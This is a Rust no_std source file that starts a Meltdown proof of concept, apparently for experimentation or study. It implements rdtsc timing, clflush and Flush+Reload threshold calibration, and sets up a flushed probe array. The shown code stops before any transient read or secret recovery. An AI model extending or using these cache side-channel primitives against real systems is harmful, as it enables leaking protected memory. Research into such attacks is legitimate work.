#![no_std]
#![feature(libc)]

extern crate alloc;
extern crate libc;

#[allow(unused_imports)]
use runtime::*;
use terminal::{print, println};

use core::arch::asm;
use libc::*;

unsafe extern "C" fn unblock_signal(signum: c_int) {
    // Rust version inspired from https://gist.github.com/ksqsf/b90877ae12c293c933800e3ead11a2e3
    let mut sigs = core::mem::uninitialized::<sigset_t>();
    sigemptyset(&mut sigs);
    sigaddset(&mut sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, std::ptr::null_mut());
}

pub fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("eax") low,
            out("edx") high
        );
    }
    ((high as u64) << 32) | (low as u64)
}

pub fn maccess(pointer: *const u128) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn flush(pointer: *const u128) {
    unsafe {
        asm!(
            "clflush [{x}]",
            x = in(reg) pointer,
        );
    }
}

pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
    let start_time: u64;
    let end_time: u64;
    
    start_time = rdtsc();
    maccess(pointer);
    end_time = rdtsc();
    
    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
    
    end_time - start_time < cache_miss_threshold
}

pub fn detect_flush_reload_threshold() -> u64{
    let mut reload_time: u64 = 0;
    let mut flush_reload_time: u64 = 0;
    let count: u64 = 10000000;
    let dummy: u128 = 0; // TODO Use single value instead of array ok?
    let pointer: *const u128;
    let mut start_time: u64;
    let mut end_time: u64;
    
    pointer = &dummy;
    
    maccess(pointer);
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        reload_time += end_time - start_time;
    }
    
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        flush(pointer);
        flush_reload_time += end_time - start_time;
    }
    
    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    reload_time /= count;
    flush_reload_time /= count;
    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    let threshold = (flush_reload_time + reload_time * 2) / 3;
    println!("Threshold: {}", threshold);
    return threshold;
}

#[unsafe(no_mangle)]
pub fn main() {
    println!("Meltdown start\n");
    const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
    const SECRET: &str = "Whoever reads this is dumb.";
    
    println!("Current CPU time: {}", rdtsc());
    let cache_miss_threshold = detect_flush_reload_threshold();
    
    let mem: [u128; ARRAY_SIZE] = [0; ARRAY_SIZE];
    
    for i in 0..ARRAY_SIZE {
        flush(&mem[i] as *const u128);
    }
}
